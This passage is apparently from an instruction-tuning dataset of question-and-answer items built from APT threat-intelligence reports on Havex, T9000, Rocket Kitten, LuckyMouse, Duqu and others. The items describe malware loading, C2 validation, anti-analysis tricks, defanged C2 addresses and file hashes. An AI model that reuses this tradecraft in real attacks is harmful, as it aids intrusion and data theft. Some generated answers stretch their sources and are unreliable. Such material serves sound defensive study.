are hosted between the havex markers in the HTML code of compromised websites. The module code is usually XORed with \u20221312312\u2022 then compressed with BZIP2 and finally base64 encoded. Once downloaded into the %TEMP%\\*.xmd file by the main Havex DLL, the code is decoded, decompressed, saved into the temporary DLL file and loaded into the memory.\nThe modules perform a variety of different actions, including collecting information about the victim\u2022s system and other machines in the local network, harvesting passwords, listing documents, etc. In order to do that, some of the modules make use of additional 3rd stage 3rd party executables.\nEach module contains configuration information stored in an encrypted and compressed form inside a resource. Configuration data includes 29-byte UID (unique ID), a 1024-bit RSA Public key (base64 encoded) and other necessary info (like file paths, etc.). All harvested data is compressed, encrypted and written into the %TEMP%\\*.yls files, which are then sent to the C&C by the main Havex/Sysmain module.\nThe \u2022yls\u2022 files are encrypted with the 3DES crypto algorithm using a random 192-bit key (168 bit effective). The 3DES key is encrypted using the public RSA 1024 key and therefore never transferred in plain text to attackers.\nIn-depth analysis of the cryptography used by log files is presented in Appendix 2\nQ: How does the Havex component download and load additional DLL modules into memory? Describe the process and the encryption methods used.",
    "output": "The Havex component downloads and loads additional DLL modules into memory by injecting itself into the EXPLORER.EXE process and sending a GET/POST request to a PHP script on compromised websites acting as C&C servers. It reads the HTML document returned by the script, looking for base64 encrypted data between 'havex' strings in a comment tag. This data is written to a temporary file in the %TEMP% directory. Another routine constantly checks the %TEMP% folder for *.xmd files, decompresses the content, decrypts it if necessary, and loads it into memory as a DLL. The malware copies itself to a temporary location and creates an autorun registry key to run on each system boot. All samples contain a statically linked bzip2 library, and versions >= 01B also contain an RSAeuro library for encrypting log files and decrypting downloadable modules.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: What happened?\nIn March 2018 we detected an ongoing campaign targeting a national data center in the Central Asia that we believe has been active since autumn 2017. The choice of target made this campaign especially significant \u2013 it meant the attackers gained access to a wide range of government resources at one fell swoop. We believe this access was abused, for example, by inserting malicious scripts in the country's official websites in order to conduct watering hole attacks.\nThe operators used the HyperBro Trojan as their last-stage in-memory remote administration tool (RAT). The timestamps for these modules are from December 2017 until January 2018. The anti-detection launcher and decompressor make extensive use of Metasploit's shikata_ga_nai encoder as well as LZNT1 compression.\nKaspersky Lab products detect the different artifacts used in this campaign with the following verdicts: Trojan.Win32.Generic, Trojan-Downloader.Win32.Upatre and Backdoor.Win32.HyperBro. A full technical report, IoCs and YARA rules are available from our intelligence reporting service (contact us intelligence@kaspersky.com).\n\nWhy did the LuckyMouse APT group choose to target a national data center in Central Asia, and how did they leverage this access to conduct further attacks?",
    "output": "A: The LuckyMouse APT group targeted a national data center in Central Asia because it provided them with access to a wide range of government resources in one single operation. This strategic choice allowed them to maximize their impact and efficiency. Once they gained access to the data center, they inserted malicious scripts into the country's official websites. These scripts were used to conduct watering hole attacks, which are designed to compromise visitors to these websites. By targeting a centralized resource like a national data center, the attackers could potentially infect a large number of users who interact with government services, thereby expanding the scope of their campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Smoaler malware's use of temporary files, specifically the DW20.DLL file, relate to the CWE-377: Insecure Temporary File vulnerability, and what potential risks does this pose to the infected system?",
    "output": "CWE-377: Insecure Temporary File refers to a vulnerability where an application creates and uses temporary files in an insecure manner, leaving system and application data vulnerable to attack. In the case of the Smoaler malware, it creates a temporary file named DW20.DLL in the %TEMP% folder, which is then executed. This file is used to drop another program file, which is executed and then deleted. The use of temporary files in this manner poses several risks to the infected system. Firstly, the temporary file DW20.DLL is created in a predictable location, making it potentially vulnerable to exploitation by other malicious actors. Additionally, the fact that the file is executed and then deleted means that forensic analysis of the system may be hindered, as the file is no longer present on the system. Furthermore, the use of temporary files in this manner can also lead to potential issues with system stability and security, particularly if the malware is able to exploit vulnerabilities in the system or other applications. Overall, the Smoaler malware's use of temporary files highlights the importance of secure temporary file handling practices, as outlined in CWE-377.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the primary offensive capabilities of the Hydraq backdoor, and how does it utilize these capabilities to achieve its goals?",
    "output": "The primary offensive capabilities of the Hydraq backdoor include probing, exfiltration of sensitive information, surveillance, covert communication channels, and covering tracks. These capabilities allow the backdoor to search, explore, and investigate the compromised system, extract useful information from the Windows Registry, determine available services and logical drives, manipulate files and registries, capture images, audio, and video for surveillance, and cover its tracks by removing evidence and avoiding forensic discovery. For example, using Command 0x03 Task 0x00 and Task 0x01, a remote attacker can extract information from the Windows Registry, and using Command 0x07 Task 0x0B, the attacker can initiate real-time graphical control to watch a user's desktop.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: ROCKET KITTEN TOOLS & INFRASTRUCTURE\nThe Rocket Kitten attacker group's main attack vector is spear-phishing. An effective phishing campaign requires nothing more than a tailored phishing page, hosted on a cheaply-available web server. As described in previous publications, the Rocket Kitten attackers make extensive use of various phishing schemes, often including back-and-forth e-mail correspondence with the victims, or even phone calls to establish legitimacy and reason to open the malicious attachment.\nActual malicious attachments detected in this campaign varied between a set of custom-written malware pieces, or 'downloader' components that, in turn, fetch the malware from a remote server and execute in on the victim machine.\nAdditionally, we have witnessed many attacks using various 'web hacking' tools and suites, in attempt to break into victim web sites.\nPreviously reported custom-malware included:\n\u2022 CWoolger\u2014a C++ based 'woolen key-logger.' The malware records all keystrokes and sends out key-log data to a hard-coded FTP server.\n\u2022 Wrapper/Gholee\u2014repurposed Core Impact penetration testing tool. The malware allows a platform for remote access, pivoting for lateral movement and further malware installation.\n\u2022 FireMalv\u2014a .NET based Firefox credential stealer. This tool copies passwords stored in the Firefox browser storage.\nCheck Point investigations additionally discovered the attackers using the following:\n\u2022 .NETWoolger\u2014a .NET based 'woolen key-logger.' This malware is functionally similar to CWoolger. The attackers seem to use them interchangeably, as alternate infection mechanisms (in case one is detected at the victim computer).\n\u2022 MPK\u2014a custom RAT of wider functionality. The malware allows key-logging, as well as remote command execution, screenshot grabbing and traffic monitoring. For a detailed technical description of the MPK malware see Appendix B.\nIn addition to custom-written malware, we have seen the attackers use various hacking and scanning tools to attack victim web-sites.\n\u2022 Metasploit\u2014An open-source, extensible penetration testing platform. Metasploit's 'meterpreter' payload was wrapped in an executable file and distributed as a RAT attached to phishing emails by the attackers.\n\u2022 Havij & SQLMap\u2014SQL injection tools; Havij originates in Iranian development, while SQLMap is an open source project.\n\u2022 Acunetix & Netsparker\u2014off-the-shelf web vulnerability scanners, attempting to automatically discover and exploit vulnerabilities in common web platforms.\n\u2022 WSO Web Shell\u2014a well-known web shell - PHP script that allows backdoor access on a hacked server. Typically deployed after successful compromise to allow further actions.\n\u2022 NIM-Shell\u2014a web shell of Iranian hacker group origin with similar functionality. Additionally uses Perl scripts on the hacked server.\nWeb hacking attempts were detected to originate from various IP ranges, occasionally immediately adjacent to known Rocket Kitten C&C servers. We can estimate the attack operators either used these servers directly, or configured them as Proxy/VPN endpoints to channel their attacks.\nCombining the research work done so far with observed attacks by Check Point, we can map out a diagram overviewing the attacker's infrastructure.\n\u2022 We have no reason to believe any of the mentioned providers are related to the malicious activity. The campaign operators likely masqueraded as a legitimate customer or hacked into the servers without the knowledge of the service provider.\n\u2022 Specified ranges are likely to be assigned in whole for the attackers use. Due to the dynamic nature of IP assignment, these may expire after the release of this report.\n\u2022 Because of the way satellite communications work, the infrastructure geo-located to Germany may not be physically located in that country. It would be an educated speculation to assume the servers are physically located in Iran. This assumption is supported by several indicators, including registrant details.\n\nWhat types of custom-written malware were used by the Rocket Kitten group, and how did these tools contribute to their cyber-espionage activities?",
    "output": "A: The Rocket Kitten group used several types of custom-written malware to support their cyber-espionage activities. These included CWoolger, a C++ based woolen key-logger that recorded keystrokes and sent the data to a hard-coded FTP server; Wrapper/Gholee, a repurposed Core Impact penetration testing tool allowing remote access and lateral movement; FireMalv, a .NET based Firefox credential stealer that copied passwords stored in the browser; .NETWoolger, a .NET based woolen key-logger functionally similar to CWoolger; and MPK, a custom RAT with wider functionality that allowed key-logging, remote command execution, screenshot grabbing, and traffic monitoring. These tools enabled the attackers to gain unauthorized access, steal sensitive information, and maintain persistence within the compromised systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: IOC's\nC2 IP: 198.55.120[.]143:7386\nURL: http://198.55.120[.]143:7386/B/ResN32.dll\nMD5 (RTF):\t\n  fdb6543bfb77aa6ddff0f4dfe07e442f\nMD5 (T9000 main binary): d8d70851641efbdfce8d561e6b1a2f29\nMD5 (Elevate.dll): 1d335f6a58cb9fab503a9b9cb371f57b\nMD5 (QQMgr.dll): b9c584c7c34d14599de8cd3b72f2074b\nMD5 (QQMgr.inf): 8ac933be588f49560179c26ddbc6a753\nMD5 (ResN32.dat): 50753c28878ce10a748fbd7b831ecbe1\nMD5 (ResN32.dll): a45e5c32fc2bc7be9d6e4bba8b2807bf\nMD5 (hccutils.dll): 2299fb8268f47294eb2b18282540a955\nMD5 (hccutils.inf): 2f31ef1a8fca047ed0d623010d569857\nMD5 (hjwe.dat): d3601a5160b8d122261989d147221eb7\nMD5 (qhnj.dat): a9de62186cb8d0e23b0dc75e1ae373ac\nMD5 (tyeu.dat): 29ec20f5fa1817dc9250c434e61420ea\nMD5 (vnkd.dat): 35f4ce864c3a3dc016fea3459d6402a9\nSHA-\u00ad\u2010256 (RTF): 8e4de6fb35ce4cd47e06b48fb86b7da3eba02031cfd8ae714e25f8f7903f0141\nSHA-\u00ad\u2010256 (T9000 main binary): 7c04286734718300e2c0691be9b6622f2d2525ca07ab27102a424af6f8cc3aec\nSHA-\u00ad\u2010256 (Elevate.dll): 9c23febc49c7b17387767844356d38d5578727ee1150956164883cf555fe7f95\nSHA-\u00ad\u2010256 (QQMgr.dll): bf1b00b7430899d33795ef3405142e880ef8dcbda8aab0b19d80875a14ed852f\nSHA-\u00ad\u2010256 (QQMgr.inf): ace7e3535f2f1fe32e693920a9f411eea21682c87a8e6661d3b67330cd221a2a\nSHA-\u00ad\u2010256 (ResN32.dat): 5b90fa081e3ac29a7339995f9b087dab9981409ff62e3215eb558908c6b96b14\nSHA-\u00ad\u2010256 (ResN32.dll): 1cea4e49bd785378d8beb863bb8eb662042dffd18c85b8c14c74a0367071d9a7\nSHA-\u00ad\u2010256 (hccutils.dll): 3dfc94605daf51ebd7bbccbb3a9049999f8d555db0999a6a7e6265a7e458cab9\nSHA-\u00ad\u2010256 (hccutils.inf): f05cd0353817bf6c2cab396181464c31c352d6dea07e2d688def261dd6542b27\nSHA-\u00ad\u2010256 (hjwe.dat): bb73261072d2ef220b8f87c6bb7488ad2da736790898d61f33a5fb7747abf48b\nSHA-\u00ad\u2010256 (qhnj.dat): c61dbc7b51caab1d0353cbba9a8f51f65ef167459277c1c16f15eb6c7025cfe3\nSHA-\u00ad\u2010256 (tyeu.dat): e52b5ed63719a2798314a9c49c42c0ed4eb22a1ac4a2ad30e8bfc899edcea926\nSHA-\u00ad\u2010256 (vnkd.dat): c22b40db7f9f8ebdbde4e5fc3a44e15449f75c40830c88932f9abd541cc78465\nBig Headline: Targeted Exploitation #7: T9000, Chinese Exchange Program Bait File\nThis document\t\n \u00a0exploits CVE-\u00ad\u20102012-\u00ad\u20100158,\t\n \u00a0CVE-\u00ad\u20102012-\u00ad\u20101856 and CVE-\u00ad\u20102015-\u00ad\u20101641 and drops an instance of the T9000 \t\n \u00a0keylogger malware. The bait\t\n \u00a0file for this instance of T9000 involves an exchange program. The Chinese document\t\n \u00a0and a\t\n \u00a0rough English translation are as follows:\nThe bait\t\n  file shows the author of \"HBWBEI\" and last\t\n  modified by \"jack\". Office metadata\t\n  suggests that\t\n  the file was created on March 30 of 2011, and last\t\n  printed on April 3, 2008. We are not\t\n  sure how a\t\n  document\t\n  could be printed before it\t\n  is created. Perhaps the threat\t\n  actors have learned to time travel, or these values are crafted. In any event, the last\t\n  modified date has a\t\n  correspondence with threat\t\n  activity in this case.\nThe T9000 behavior in this sample was different\t\n  from other samples in that\t\n  the Intel folder only contained a\t\n  small amount\t\n  of files, for unknown reasons. In this case, the Intel folder only contains hjwe.dat\t\n  (the \"encrypted core of the malware family\", as discovered by Palo Alto Networks), ~1 (\"debug information about\t\n  files used by malware\") and a\t\n  \"Data\" folder containing dtl.dat\t\n  (encrypted config) and glp.uin (plugin configuration) files. File hash values for these files match what\t\n  was previously documented in targeted exploitation incident\t\n  #5.\nMedium Headline: Connections to Historical and Ongoing Threat Campaign Activity\nObservation of the sample suggests that\t\n \u00a0the C2 is 198.55.120[.]143 on TCP/7386. This IP and port\t\n \u00a0was observed in two other samples in this campaign/engagement. Automated analysis of the configuration itself suggests that\t\n \u00a0the C2 port\t\n \u00a0is TCP/8080 however. Further investigation is required to determine the reason for the discrepancy. Connecting to TCP/8080 of this C2 with a\t\n \u00a0browser results in the download of a\t\n \u00a0file called \"download\" with an MD5 hash of e1269c22ad1e057b9c91523498b4b04d and a\t\n \u00a0SHA-\u00ad\u2010256 hash of b9914fb8c645e0c41d497db303c1ffa594da709686252fccb8d28dffac86275b. This file is delivered to the user after the user presents an HTTP GET. Connecting to this port\t\n \u00a0with telnet\t\n \u00a0and manually issuing a\t\n \u00a0GET results in the delivery of nine bytes from the server. The server then appears to wait\t\n \u00a0for a\t\n \u00a0response. These nine bytes contain the ASCII\t\n \u00a0text\t\n \u00a0\"eueuX_\". There are unprintable characters present\t\n \u00a0however, including 0x05, 0x1b, and 0x12 as seen in this hexdump:\n65 75 65 75 05 1b 12 58 5f |eueu...X_|\nThe same GET connection used on TCP/8080 can also be used on 8088/tcp and 8089/tcp on this particular C2 to obtain the same response consisting of the exact\t\n  same sequence of bytes. It\t\n  is possible that\t\n  this server is configured to support\t\n  multiple campaigns, multiple actor groups, or there may be some other explanation.\nAwareness of this responsive pattern could provide for a\t\n \u00a0potentially useful method to fingerprint\t\n \u00a0a\t\n \u00a0T9000 C2. This communication pattern has been observed in the wild at\t\n \u00a0least\t\n \u00a0as far back as 2014-\u00ad\u201003-\u00ad\u201025\t\n \u00a021:06:19\t\n \u00a0UTC,\t\n \u00a0when someone submitted a\t\n \u00a0sample of this byte sequence to Virus Total (MD5: e1269c22ad1e057b9c91523498b4b04d).\nThis C2 IP address is clearly of interest\t\n \u00a0since it\t\n \u00a0has been used by several samples uncovered in this engagement. Some basic analysis of the C2 reveals the following open ports (filtered ports have been removed from this list). The ports in bold appear to be associated the server-\u00ad\u2010side component\t\n \u00a0of T9000 in this instance:\nConnecting to the Remote Desktop port\t\n  on the server gives us a\t\n  sense of the language in use on the server.\nBig Headline: Targeted Exploitation #8: T9000 \u2013 Tibetan Protester Theme\nThe malicious RTF file, using the name \"One Tibetan Protester is Freed, Two Others Are Jailed.doc\" was first\t\n \u00a0observed in the wild on 2015-\u00ad\u201012-\u00ad\u201031\t\n \u00a005:34:17 and submitted for analysis to Virus Total from India. The RTF document\t\n \u00a0exploits CVE-\u00ad\u20102012-\u00ad\u20100158,\t\n \u00a0CVE-\u00ad\u20102012-\u00ad\u20101856 and CVE-\u00ad\u20102015-\u00ad\u20101641. This document\t\n \u00a0has been determined to drop the T9000 backdoor malware based on the presence of a\t\n \u00a0URL pointing to the previously discovered T9000 C2 string (http://198.55.120[.]143:7386/B/ResN32.dll). The insightful T9000 report\t\n \u00a0from Palo Alto Networks describes this ResN32.dll file as a\t\n \u00a0\"Malicious DLL. Decrypts, decompresses, and loads core malware\".\t\n \u00a0Other obvious strings are present\t\n \u00a0such as the PDB string \"D:\\WORK\\T9000\\N_Inst_User_M1\\Release\\N_Inst_User32.pdb\" and many other clear T9000 artifacts.\nWith regards to the bait\t\n  file \"One Tibetan Protester is Freed, Two Others Are Jailed.doc\", we can see that\t\n  it\t\n  was copied from a\t\n  website. A news item from December 4, 2015 was posted on Radio Free Asia\t\n  [30] using this exact\t\n  Tibetan Protester document\t\n  title. The webpage from Radio Free Asia\t\n  is seen on the left\t\n  below and the bait\t\n  file that\t\n  appears to have been built\t\n  from the website is on the right.\nThe bait\t\n  file document\t\n  metadata\t\n  indicates that\t\n  it\t\n  was created and modified by \"HighSea\" on 12/31/2015, the same day that\t\n  the file was uploaded to Virus Total and the same day other threat\t\n  activity was observed against\t\n  the Tibetan community. The name \"HighSea\" appears in other malicious document\t\n  metadata\t\n  profiled within this report.\n\nIn Targeted Exploitation #8, what specific vulnerabilities are exploited by the malicious RTF file 'One Tibetan Protester is Freed, Two Others Are Jailed.doc', and what indicators confirm the presence of the T9000 backdoor malware? How does the document metadata provide insights into the threat actor's activities?",
    "output": "The malicious RTF file 'One Tibetan Protester is Freed, Two Others Are Jailed.doc' exploits three specific vulnerabilities: CVE-2012-0158, CVE-2012-1856, and CVE-2015-1641. The presence of the T9000 backdoor malware is confirmed by the URL pointing to the previously discovered T9000 C2 string (http://198.55.120[.]143:7386/B/ResN32.dll) and the PDB string 'D:\\WORK\\T9000\\N_Inst_User_M1\\Release\\N_Inst_User32.pdb', among other clear T9000 artifacts. The document metadata indicates that the file was created and modified by 'HighSea' on 12/31/2015, the same day it was uploaded to Virus Total and the same day other threat activity was observed against the Tibetan community. This metadata provides insights into the threat actor's activities, suggesting coordinated efforts targeting specific communities on specific dates.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Cyber Attack Impersonating Identity of Indian Think Tank to Target Central Bureau of Investigation (CBI) and Possibly Indian Army Officials\n5/11/2017\nIn my previous blog posts I posted details of cyber attacks targeting (<https://cysinfo.com/uri-terror-attack-spear-phishing-emails-targeting-indian-embassies-and-indian-mea/>)Indian Ministry of External Affairs and (<https://cysinfo.com/cyber-attack-targeting-indian-navys-submarine-warship-manufacturer/>)Indian Navy's Warship and Submarine Manufacturer. This blog post describes another attack campaign where attackers impersonated identity of Indian think tank (<https://en.wikipedia.org/wiki/Institute_for_Defence_Studies_and_Analyses>)IDSA (Institute for Defence Studies and Analyses) and sent out spear-phishing emails to target officials of the Central Bureau of Investigation (CBI) and possibly the officials of\nBig Headline: Indian Army.\nThe (<https://en.wikipedia.org/wiki/Central_Bureau_of_Investigation>)Central Bureau of Investigation (CBI) is the domestic intelligence and security service of India and serves as the India's premier investigative and Interpol agency operating under the jurisdiction of the Government of India.\nIn order to infect the victims, the attackers distributed spear-phishing emails containing malicious excel file which when opened dropped a malware capable of downloading additional components and spying on infected systems. To distribute the malicious excel file, the attackers registered a domain which impersonated the identity of most influential Indian think tank (<https://en.wikipedia.org/wiki/Institute_for_Defence_Studies_and_Analyses>)IDSA (Institute for Defence Studies and Analyses) and used the email id from the impersonating domain to send out the spear-phishing emails to the victims.\nMedium Headline: Anti-Analysis Techniques in the Malicious Excel File\nWhen the victim opens the attached excel file it prompts the user to enable macro content as shown in the below\nscreen shot.\nTo prevent viewing of the macro code and to make manual analysis harder attackers password protected the macro content as show below.\nEven though the macro is password protected, It is possible to extract macro code using analysis tools like (<https://www.decalage.info/python/oletools>)oletools. In this case oletools was used to extract the macro content but it turns out that the oletools was able to extract only partial macro content but it failed to extract the malicious content present inside a Textbox within the Userform. Below screen shot shows the macro content extracted by the oletools.\nThis extracted macro content was copied to new excel workbook and the environment was setup to debug the macro code. Debugging the macro code failed because the macro code accesses the textbox content within the UserForm (which oletools failed to extract). The technique of storing the malicious content inside the TextBox within the UserForm allowed the attackers to bypass analysis tools. Below screen shot shows the macro code accessing the content from the TextBox and the error triggered by the code due to the absence of the TextBox content.\nTo bypass the anti-analysis technique and to extract the content stored in the TextBox within the UserForm the password protection was bypassed which allowed to extract the content stored within the UserForm. Below screen shot shows the TextBox content stored within the UserForm.\nAt this point all the components (macro code and the UserForm content) required for analysis was extracted and an environment similar to the original excel file was created to debug the malicious macro. Below screen shots show the new excel file containing extracted macro code and the UserForm content.\nMedium Headline: Analysis of Malicious Excel File\nWhen the victim opens the excel file and enables the macro content, The malicious macro code within the excel file is executed. The macro code first generates a random filename as shown in the below screen shot.\nIt then reads the executable content stored in the TextBox within the UserForm and then writes the executable content to the randomly generate filename in the %AppData% directory. The executable is written in .NET framework\nThe content stored in the TexBox within the UserForm is an executable content in the decimal format. Below screen shot shows converted data from decimal to text. In this case the attackers used the TextBox within the UserForm to store the malicious executable content.\nBig Headline: Input:\nThe dropped file in the %AppData% directory is then executed as shown in the below screen shot.\nOnce the dropped file is executed it copies itself into %AppData%\\SQLite directory as SQLite.exe and executes as shown below.\nAs a result of executing SQLite.exe it makes a HTTP connection to the C2 server (qhavcloud[.]com). The C2 communication shown below contains a hard coded user-agent and the double slash (//) in the GET request this can be used to create network based signatures.\nSmall Headline: a) Malware Validates C2 Connection\nMalware checks if the executable is running as SQLite.exe from %AppData%\\SQLite directory, if not it copies itself as SQLite.exe to %AppData%\\SQLite directory as shown below.\nIt then launches the executable (SQLite.exe) with the command line arguments as shown in the below screen shots.\nMalware performs multiple checks to make sure that it is connecting to the correct C2 server before doing anything malicious. first its pings the C2 domain qhavcloud[.]com. Below screen shots show the ping to the C2 server.\nIf the ping succeeds then it determines if C2 server is alive by sending an HTTP request, it then reads the content from the C2 server and looks for a specific string \"Connection!\". If it does not find the string \"Connection!\" it assumes that C2 is not alive or it is connecting to the wrong C2 server. This technique allows the attackers to validate if they are connecting to the correct C2 server and also this technique does not reveal any malicious behavior in dynamic/sandbox analysis until the correct response is given to the malware. Below screen shots show the code that is performing the C2 connection and the validation.\nIf the ping does not succeed or if the C2 response does not contain the string \"Connection!\" then the malware gets\nthe list of backup C2 servers to connect by downloading a text file from the Google drive link. This technique of storing a text file containing the list of backup C2 servers on the legitimate site has advantages and it is highly unlikely to trigger any suspicion in security monitoring and also can bypass reputation based devices. Below screen shots show the code that downloads the text file and text file (info.txt) saved on the disk.\nDuring the time of analysis the text file downloaded from the Google drive link was populated with two private IP addresses, it looks like the attackers deliberately populated the IP addresses with two private IP addresses to prevent the researchers from determining actual IP/domain names of the backup C2 servers. Below screen shot shows the IP addresses in the text file.\nOnce the text file is downloaded the malware reads each and every IP address from the text file and performs the same C2 validation check (ping and checks for the string \"Connection!\" from the C2 response). Below screen shot shows the HTTP connection made to those IP addresses.\nSmall Headline: b) Malware Sends System Information\nBased on the analysis it was determined that the malware looks for a string \"Connection!\" in the C2 response, so the analysis environment was configured to respond with a string \"Connection!\" whenever the malware made a C2 connection. Below screen shot shows the C2 communication made by the malware and the expected response.\nOnce the malware validates the C2 connection then the malware creates an XML file (SQLite.xml) inside which it stores the user name and the password to communicate with the C2 server. Malware generates the user name to communicate with the C2 by concatenating a) the machine name, b) a random number between 1000 to 9999 and c) the product version of the file. Below screen shot shows the code that generates the user name\nMalware generates the password to communicate with the C2 by building an array of 16 random bytes, these random bytes are then encoded using base64 encoding algorithm and malware then replaces the characters \"+\" and\n\"/\" with \"-\" and \"_\" respectively from the encoded data. The attackers use the technique of replacing the standard characters with custom characters to makes it difficult to decode the string (containing the characters \"+\" and \"/\") using standard base64 algorithm. Below screen shot shows the code that generates the password.\nOnce the user name and password is generated, malware then creates an XML file (SQLITE.xml) and populates the XML file with the generated user name and password. Below screen shot shows the code that creates the XML file\nBelow screen shot shows the XML file populated with the user name and the password which is used by the malware to communicate with the C2 server.\nThe malware then collects system information like the computer name, operating system caption, IP address of the infected system, product version of the executable file and sends it to the C2 server along with the generated user\nname and password using a POST request to postdata.php. Below screen shots show the code that collects the system information and the data that is sent to the attacker.\n\nQ: How does the malware generate the username and password for communicating with the C2 server, and what system information does it collect and send to the attacker?",
    "output": "A: The malware generates the username by concatenating the machine name, a random number between 1000 and 9999, and the product version of the file. It generates the password by building an array of 16 random bytes, encoding them using base64, and replacing the characters '+' and '/' with '-' and '_', respectively. The malware then creates an XML file (SQLITE.xml) containing the username and password. It collects system information such as the computer name, operating system caption, IP address of the infected system, and product version of the executable file, and sends this information to the C2 server along with the generated username and password using a POST request to postdata.php.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Threat Overview\nThe threat activity observed in the past weeks against various targets in our customer base has shown patterns that allowed us to discover multiple servers hosting and distributing malicious software (Bots).\nAs it is known by the network defenders and the security community, it is important to defend against these attacks since systems infected with these malicious specimens could be used for credential theft, Distributed Denial of Service Attacks, spreading malware, lateral propagation, etc. This is of great concern as the first stage attack continues to bypass network security defenses infecting user's computers that beacon to malicious servers to download or create the second stage malware into the victim systems.\nSome of the main Bot types of malware detected through this research include:\n\nBased on the above text, answer a question. How does the initial infection with Bots malware, as described in the APT report 'FTA_1014_Bots_Machines_and_the_Matrix', bypass network security defenses and what are the potential consequences of this bypass?",
    "output": "The initial infection with Bots malware bypasses network security defenses by infecting users' computers, which then communicate with malicious servers to download or create the second stage malware into the victim systems. This bypass is concerning because it allows the malware to establish a foothold within the network. The potential consequences of this bypass include credential theft, Distributed Denial of Service (DDoS) attacks, spreading additional malware, and lateral propagation within the network. These activities can compromise sensitive data, disrupt services, and further spread the infection to other systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Rocra campaign compare to other well-known cyber-espionage campaigns like Aurora and Night Dragon in terms of sophistication and longevity? What makes Rocra stand out?",
    "output": "Compared to Aurora and Night Dragon, Rocra is significantly more sophisticated. It involves over 1000 unique files and about 30 different module categories, allowing it to stay undetected for over 5 years while exfiltrating vast amounts of data. Rocra stands out due to its highly personalized approach, where each attack is tailored to the specific victim, and its ability to evade detection by most antivirus products.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1.Introduction\nStuxnet is probably the most well-known malware of our times. Its fame stems from the facts that it targeted a very specific industrial facility, namely a uranium enrichment plant in Iran, it aimed at physical destruction of uranium centrifuges, and it apparently accomplished its mission successfully. In addition to all these characteristics, IT security experts also appreciate its technical sophistication and the zero-day exploits that it used. Stuxnet was also an alarm to the developed world: it shed light on the capabilities of advanced attackers, and at the same time, on the numerous weaknesses of our computing infrastructure. Putting these two together, people started to feel hopelessly vulnerable.\nYet, unfortunately, Stuxnet is not a unique example for a highly sophisticated targeted threat, but there are numerous other pieces of malware of similar kind, including Duqu, Flame, Regin, etc. Among those, Duqu is particularly interesting, not only because we discovered it back in 2011, but because our analysis pointed out that - while Duqu's objective is different - it has very strong similarities to Stuxnet in terms of architecture, code, and methods to achieve stealthiness. Today, it is widely believed within the IT security community that Duqu was created by the same attackers who created Stuxnet.\nAnd now we have a new member of the same family! Last month, we received interesting samples from Kaspersky Lab with a hint that they might be related to the Duqu samples of 2011; however, these new samples are from 2014. Our common understanding was that it would be interesting to figure out whether this new threat is indeed related to the old Duqu attack, and we in the CrySyS Lab should try to focus our analysis efforts on answering this question. It is important to emphasize that we did our analysis independently from Kaspersky Lab: we did not read their preliminary report and they did not share any of their findings with us (apart from the samples that we received from them).\nThe analysis results performed by Kaspersky Lab can be read in the following report:\nIn this report, we present the results of our comparative analysis of the old version of Duqu and the new version, codenamed \"Duqu 2.0\". We concentrate on the description of the relevant similarities and differences we have found between the two malware samples.\n\nQ: How does the architecture and code of Duqu compare to Stuxnet, and what implications does this have for attribution and understanding the capabilities of the attackers?",
    "output": "A: The architecture, code, and methods used by Duqu to achieve stealthiness are very similar to those of Stuxnet. This similarity has led the IT security community to believe that Duqu was created by the same attackers who created Stuxnet. Understanding these similarities helps in attributing the attacks to the same group and provides insights into the advanced capabilities and techniques employed by these attackers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the APT malware described in FTA 1011 Follow UP report collect data from infected systems and what techniques are used to gather information?",
    "output": "Collection is a critical phase in an adversary's attack lifecycle where they gather information relevant to their goals. In the case of the APT malware described in FTA 1011 Follow UP report, the malware collects data from infected systems through various techniques. The field unit component (netui3.dll) conducts reconnaissance and data collection by collecting information about systems it comes into contact with, collecting file listings from local and shared connected drives, discovering and connecting to shared drives, and copying and writing files to/from drives visible to the local targeted system. Additionally, the headquarters component (netsat.exe) receives commands from a locally stored encrypted file, which allows it to collect data gathered by the field unit component. The malware also logs certain events in a file located at CSIDL_MYPICTURES\\wins, which could potentially be used to gather information about the infected system. Furthermore, the malware's use of an encrypted file stored on the system where it is executing suggests that intruders may have local or remote access to headquarters systems running netsat.exe or access to another application that automates remote C2 data/file retrieval. Overall, the APT malware uses a combination of techniques to collect data from infected systems, including reconnaissance, file listing, and data copying, and uses encryption and logging to gather information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Section Summary:\nSong Yubo and his research center at Southeast University appear to be central players in this narrative, as highlighted by their \u0141nancial connections to the government of China, in particular the Ministry of State Security (MSS), China's premier human intelligence agency.\nIf the MSS was involved, we can deduce that the Anthem hack could have been for the purposes of gathering sensitive information for follow-on HUMINT targeting via blackmail, asset recruitment or technical targeting operations against individuals at home.\nSong's use of the topsec email alias suggests a greater association w/ TOPSEC.\nIt seems as if the competition is almost certainly the cause for the topsec2014[.]com domain.  What is very curious, however, is the initial registration by the reseller li2384826402@yahoo[.]com, which is a tactic seen within the con\u0141rmed malicious faux VAE Inc.infrastructure.\nThe overlap between the competition website and the static command and control infrastructure seen in the Derusbi /\nSakula implant is was likely an error made by the attackers.\nBig Headline: The Company\nTo enhance our open-source capabilities, we partnered up with Dr. James Mulvenon[54] and his team of China experts at Defense Group, Inc. (DGI)[55].  We shared with them everything that we knew at the time, walking through the technical details which led us all the way to Song Yubo and the competition announcement.\nFrom there, they were able to uncover a wealth of very consequential background information on Beijing Topsec Technology Co (Beijing Topsec), the sponsoring organization for Song Yubo's information security competition.\nDGI's research indicated that Beijing Topsec is one of the largest information security hardware providers in China. In 1996, they were the \u0141rst Chinese company to break into the market with the release of China's \u0141rst indigenously-manufactured \u0141rewall. Since then, they have expanded their business to include a consulting practice focused on issues such as 